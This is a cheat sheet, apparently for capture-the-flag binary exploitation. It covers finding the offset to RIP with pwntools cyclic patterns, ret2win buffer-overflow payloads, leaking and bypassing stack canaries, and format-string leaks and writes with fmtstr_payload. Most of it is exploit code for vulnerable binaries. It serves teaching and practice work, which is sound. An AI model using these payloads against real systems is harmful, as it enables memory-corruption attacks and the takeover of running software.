Finding offset to RIP

cyclic(200)generate 200-byte De Bruijn pattern
cyclic_find(0x6161616b)find offset from crashed RIP value
Workflow:
p.sendline(cyclic(200))crash the program
# in GDB: info reg ripnote the bad RIP value
cyclic_find(rip_value)= offset to RIP
GDB alternative: x/100wx $rsp → find pattern bytes, calculate manually

ret2win — basic overflow

Fill buffer → overwrite saved RBP (8B) → overwrite RIP with win() addr
offset = cyclic_find(...)e.g. 40
win = elf.symbols['win']or p&win in GDB
payload = b'A' * offsetfill to saved RBP
payload += b'B' * 8overwrite saved RBP
payload += p64(win)overwrite RIP
⚠ If MOVAPS crash (stack alignment): prepend a ret gadget before win addr
ret = rop.find_gadget(['ret'])[0]
payload += p64(ret) + p64(win)

Stack canary — leak & bypass

Canary = random 8-byte value, LSB always \x00. Placed between locals and saved RBP. Checked before ret — kills process if changed.
# leak via printf/puts
# fill buffer to canary offsetuse cyclic to find
# read leaked bytes (8B)recvuntil / recvline
canary = u64(leak.ljust(8,b'\x00'))unpack
payload = b'A' * buf_offsetto canary
payload += p64(canary)restore canary!
payload += b'B' * 8saved RBP
payload += p64(win)overwrite RIP
GDB: x/gx $rbp-8 shows canary value

printf format string

Vulnerable: printf(buf) — no format string arg.
%pprint pointer (hex) — leak stack values
%xprint hex (32-bit)
%sdereference as string
%nwrite # chars printed to pointer arg
%7$pdirect param: leak 7th arg on stack
%7$sdereference 7th arg as string
Find offset to your input on the stack:
AAAA%1$p %2$p %3$p...look for 0x41414141
Leak canary (if it's at e.g. offset 11):
p.sendline(b'%11$p')prints canary as hex ptr
Write with pwntools helper:
payload = fmtstr_payload(offset,
  {addr: value})writes value to addr
